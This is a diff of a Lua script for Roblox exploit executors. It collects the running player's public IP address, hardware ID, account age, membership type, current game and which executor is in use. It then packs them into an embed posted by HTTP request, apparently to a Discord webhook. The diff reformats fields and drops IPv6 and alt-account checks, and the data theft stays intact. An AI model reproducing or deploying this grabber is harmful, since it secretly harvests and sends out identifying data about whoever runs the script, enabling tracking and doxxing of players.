@@ -1,25 +1,9 @@
 local IP = game:HttpGet("https://v4.ident.me")
-local IPv6 = game:HttpGet("https://v4.ident.me")
 plr = game:GetService'Players'.LocalPlayer
-local premium = false
-local ALT = false
-if plr.MembershipType == Enum.MembershipType.Premium then
-	premium = true
-elseif plr.MembershipType == Enum.MembershipType.None then
-	premium = false
-end
-if premium == false then 
-	if plr.AccountAge <= 70 then 
-		ALT = true
-	end
-end
-
-local AccountAge = plr.AccountAge
+local Age = plr.AccountAge
 local MembershipType = string.sub(tostring(plr.MembershipType), 21)
-
 local market = game:GetService("MarketplaceService")
 local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
-
 
 local http_request = http_request;
 if syn then
@@ -35,10 +19,10 @@ end
 local function getexploit()
     local exploit =
         (syn and not is_sirhurt_closure and not pebc_execute and "Synapse") or
+        
+        (pebc_execute and "ProtoSmasher") or
         (secure_load and "Sentinel") or
         (is_sirhurt_closure and "Sirhurt") or
-        (pebc_execute and "ProtoSmasher") or
-        (KRNL_LOADED and "Krnl") or
         (WrapGlobal and "WeAreDevs") or
         (isvm and "Proxo") or
         (shadow_env and "Shadow") or
@@ -48,9 +32,8 @@ local function getexploit()
         (OXYGEN_LOADED and "Oxygen U") or
         (IsElectron and "Electron") or
         ("Unsupported")
-  
     return exploit
-  end
+end
 
 local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
 local decoded = game:GetService('HttpService'):JSONDecode(body)
@@ -83,47 +66,32 @@ local Embed = {
     };
     fields = {
         {
-            name = 'HWID';
+            name = 'HWID:';
             value = hwid;
             inline = true
         },
         {
-            name = 'IPv4';
+            name = 'IP:';
             value = IP;
             inline = true
         },
-	{
-                   name = "IPv6",
-                   value = IPv6,
-                   inline = true
-        },
         {
-            name = 'Game';
-            value = info.Name;
+            name = 'Game:';
+            value = "[".. info.Name.."](https://roblox.com/games/" .. game.PlaceId .. "/)";
             inline = true
         },
 	 {
-                   name = "MembershipType:",
+                   name = "Membership:",
                    value = MembershipType,
                    inline = true
         },
         {
-                   name = "AccountAge:",
-                   value = AccountAge,
+                   name = "Age:",
+                   value = Age,
                    inline = true
         },
         {
-            name = 'GameID';
-            value = game.PlaceId;
-            inline = true
-        },
-        {
-            name = 'GameLink';
-            value = "[Here!](https://roblox.com/games/" .. game.PlaceId .. "/)";
-            inline = true
-        },
-        {
-            name = 'Exploit';
+            name = 'Exploit Used:';
             value = getexploit();
             inline = true
         }
@@ -138,5 +106,4 @@ local Embed = {
     };
     Body = game:GetService'HttpService':JSONEncode( { content = Content; embeds = { Embed } } );
 };
-
 end
